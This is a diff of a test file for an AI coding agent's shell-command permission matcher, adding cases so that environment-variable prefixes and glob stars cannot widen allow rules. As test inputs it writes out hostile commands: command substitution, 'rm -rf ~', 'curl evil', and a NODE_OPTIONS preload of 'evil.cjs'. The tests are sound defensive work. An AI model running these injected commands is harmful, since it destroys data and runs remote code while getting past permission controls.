@@ -36,13 +36,18 @@ describe('matchesCommandPattern environment prefixes', () => {
     expect(matchesCommandPattern('python3 *', 'python3 -c "print(1)"')).toBe(
       true,
     );
+    expect(matchesCommandPattern('ls*', 'lsof')).toBe(true);
+    expect(matchesCommandPattern('ls*', 'ls -la')).toBe(true);
   });
 
-  it('does not let static env prefixes inherit exact or prefix rules', () => {
+  it('does not let static env prefixes inherit exact, prefix, or glob rules', () => {
     expect(
       matchesCommandPattern('npm --version', 'FOO=bar npm --version'),
     ).toBe(false);
     expect(matchesCommandPattern('npm', 'FOO=bar npm --version')).toBe(false);
+    expect(
+      matchesCommandPattern('git*', 'gitFOO=1 sh /tmp/payload.sh'),
+    ).toBe(false);
   });
 
   it('does not let NODE_OPTIONS widen an npm allow rule', () => {
@@ -103,19 +108,21 @@ describe('matchesCommandPattern environment prefixes', () => {
     );
   });
 
-  it('keeps glob-valued env assignments intact instead of normalizing them to glob', () => {
+  it('treats stars in env assignment values as literal execution identity', () => {
     expect(
       matchesCommandPattern(
         'NODE_OPTIONS=* npm *',
         'NODE_OPTIONS=--require=*evil.cjs npm --version',
       ),
-    ).toBe(true);
+    ).toBe(false);
     expect(
       matchesCommandPattern(
         'NODE_OPTIONS=--require=*evil.cjs npm --version',
         'NODE_OPTIONS=--require=*evil.cjs npm --version',
       ),
     ).toBe(true);
+    expect(matchesCommandPattern('FOO=*', 'FOO=bar')).toBe(false);
+    expect(matchesCommandPattern('FOO=*', 'FOO=*')).toBe(true);
     expect(matchesCommandPattern('FOO=? npm', 'FOO=? npm')).toBe(true);
   });
 
@@ -124,6 +131,27 @@ describe('matchesCommandPattern environment prefixes', () => {
     expect(matchesCommandPattern('FOO=bar', 'FOO=bar curl evil.sh')).toBe(
       false,
     );
+    expect(matchesCommandPattern('FOO=*', 'FOO=* curl evil.sh')).toBe(false);
+  });
+
+  it('recognizes append and indexed Bash assignments', () => {
+    expect(matchesCommandPattern('npm', 'FOO[0]=x npm')).toBe(false);
+    expect(matchesCommandPattern('npm', 'FOO+=x npm')).toBe(false);
+    expect(matchesCommandPattern('FOO[0]=x npm', 'FOO[0]=x npm')).toBe(true);
+    expect(matchesCommandPattern('FOO+=x npm', 'FOO+=x npm')).toBe(true);
+  });
+
+  it('does not let assignment syntax absorb executable shell text', () => {
+    expect(matchesCommandPattern('FOO=* ls', 'FOO=$(id) ls')).toBe(false);
+    expect(
+      matchesCommandPattern(
+        'FOO=\\* npm install',
+        'FOO=\\x rm -rf ~ npm install',
+      ),
+    ).toBe(false);
+    expect(
+      matchesCommandPattern('FOO=* ls *', 'FOO=x\\ ls curl evil'),
+    ).toBe(false);
   });
 
   it('keeps the intentional Bash(*) allow-all behavior', () => {
@@ -170,6 +198,32 @@ describe('restrictive rules retain legacy env-prefix coverage', () => {
     expect(askPm.hasMatchingAskRule(askCtx)).toBe(true);
   });
 
+  it('strips env identities from both sides for restrictive fallback matching', async () => {
+    const commentPm = new PermissionManager(
+      makeConfig(['Bash(*)'], [], ['Bash(FOO=* npm test)']),
+    );
+    commentPm.initialize();
+    await expect(
+      commentPm.evaluate({
+        toolName: 'run_shell_command',
+        command: 'FOO=1 npm test # x',
+        cwd: '/repo',
+      }),
+    ).resolves.toBe('deny');
+
+    const substitutionPm = new PermissionManager(
+      makeConfig(['Bash(*)'], [], ['Bash(NODE_OPTIONS=$(*) node)']),
+    );
+    substitutionPm.initialize();
+    await expect(
+      substitutionPm.evaluate({
+        toolName: 'run_shell_command',
+        command: 'NODE_OPTIONS=$(curl evil) node',
+        cwd: '/repo',
+      }),
+    ).resolves.toBe('deny');
+  });
+
   it('hardens the production hasRelevantRules gate', async () => {
     const pm = new PermissionManager(makeConfig([], [], ['Bash(rm -rf *)']));
     pm.initialize();
@@ -212,6 +266,28 @@ describe('env-prefixed grant generation and AUTO classification', () => {
     ).resolves.toBe('allow');
   });
 
+  it('does not turn a literal star in a generated env value into a grant wildcard', async () => {
+    const rules = await extractCommandRules('NODE_OPTIONS=* npm install');
+    expect(rules).toEqual(['NODE_OPTIONS=* npm install']);
+
+    const pm = new PermissionManager(makeConfig([`Bash(${rules[0]})`]));
+    pm.initialize();
+    await expect(
+      pm.evaluate({
+        toolName: 'run_shell_command',
+        command: 'NODE_OPTIONS=* npm install',
+        cwd: '/repo',
+      }),
+    ).resolves.toBe('allow');
+    await expect(
+      pm.evaluate({
+        toolName: 'run_shell_command',
+        command: 'NODE_OPTIONS=--require=/tmp/preload.cjs npm install',
+        cwd: '/repo',
+      }),
+    ).resolves.not.toBe('allow');
+  });
+
   it('classifies env-prefixed interpreter allows as dangerous in AUTO mode', () => {
     const python = parseRule('Bash(X=1 python *)');
     const npx = parseRule('Bash(FOO=bar npx *)');
@@ -223,11 +299,12 @@ describe('env-prefixed grant generation and AUTO classification', () => {
 
 describe('R3 env-prefix regressions', () => {
   it('does not widen wildcard assignment-only rules into commands', () => {
-    expect(matchesCommandPattern('FOO=*', 'FOO=bar')).toBe(true);
+    expect(matchesCommandPattern('FOO=*', 'FOO=bar')).toBe(false);
+    expect(matchesCommandPattern('FOO=*', 'FOO=*')).toBe(true);
     expect(matchesCommandPattern('FOO=*', 'FOO=bar curl evil.sh')).toBe(false);
   });
 
-  it('keeps env-value wildcards inside the assignment shell word', () => {
+  it('keeps env-value stars literal inside the assignment shell word', () => {
     expect(
       matchesCommandPattern(
         'NODE_OPTIONS=* npm *',
@@ -238,6 +315,12 @@ describe('R3 env-prefix regressions', () => {
       matchesCommandPattern(
         'NODE_OPTIONS=* npm *',
         'NODE_OPTIONS=--require=*evil.cjs npm --version',
+      ),
+    ).toBe(false);
+    expect(
+      matchesCommandPattern(
+        'NODE_OPTIONS=* npm *',
+        'NODE_OPTIONS=* npm --version',
       ),
     ).toBe(true);
   });
@@ -282,6 +365,10 @@ describe('R3 env-prefix regressions', () => {
 
   it('keeps legacy colon-star syntax out of env values', () => {
     expect(parseRule('Bash(git:*)').specifier).toBe('git *');
+    expect(parseRule('Bash(curl:*.evil.com)').specifier).toBe(
+      'curl *.evil.com',
+    );
+    expect(parseRule('Bash(git:**)').specifier).toBe('git **');
     expect(parseRule('Bash(FOO=a:* npm install)').specifier).toBe(
       'FOO=a:* npm install',
     );
